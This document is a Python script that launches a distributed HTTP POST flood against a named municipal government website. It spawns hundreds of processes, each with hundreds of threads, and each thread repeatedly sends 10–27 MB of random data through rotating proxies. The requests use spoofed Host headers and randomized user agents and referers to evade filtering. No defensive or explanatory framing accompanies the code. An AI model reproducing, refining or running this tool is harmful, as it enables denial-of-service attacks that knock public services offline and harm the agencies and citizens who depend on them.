import multiprocessing
import threading
import requests
from requests.exceptions import ProxyError, Timeout
import random
import time
import os

def load_file(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file.readlines()]

def verify_proxy_type(proxy):
    if proxy.startswith("http://") or proxy.startswith("https://"):
        return "http"
    elif "socks4://" in proxy:
        return "socks4"
    elif "socks5://" in proxy:
        return "socks5"
    else:
        return None

def generate_random_data():
    size = random.randint(10 * 1024 * 1024, 27 * 1024 * 1024)
    return os.urandom(size)

def make_requests(user_agents, referers, proxies, fake_hosts):
    while True:
        for _ in range(450):
            try:
                proxy = random.choice(proxies)
                proxy_dict = {verify_proxy_type(proxy): proxy}
                headers = {
                    'Host': random.choice(fake_hosts),
                    'User-Agent': random.choice(user_agents),
                    'Referer': random.choice(referers),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'DNT': '1',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'TE': 'Trailers',
                }
                time.sleep(random.uniform(0.5, 2.0))
                random_data = generate_random_data()
                response = requests.post("https://www.guaruja.sp.gov.br/", headers=headers, proxies=proxy_dict, data=random_data, timeout=5)
                print(f"POST request to {headers['Host']} success: {response.status_code}")
            except (ProxyError, Timeout):
                print("Proxy failed or request timed out")
        time.sleep(random.uniform(5, 7))

def thread_function(user_agents, referers, proxies, fake_hosts):
    threads = []
    for _ in range(309):
        thread = threading.Thread(target=make_requests, args=(user_agents, referers, proxies, fake_hosts))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def main():
    user_agents = load_file("useragents.txt")
    referers = load_file("referers.txt")
    proxies = [proxy for proxy in load_file("proxy.txt") if verify_proxy_type(proxy)]
    fake_hosts = ["https://check-host.net", "https://www.instagram.com", "https://developers.facebook.com/docs/instagram"]

    while True:
        processes = []
        for _ in range(297):
            process = multiprocessing.Process(target=thread_function, args=(user_agents, referers, proxies, fake_hosts))
            processes.append(process)
            process.start()

        for process in processes:
            process.join()
        
        time.sleep(1)

if __name__ == "__main__":
    main()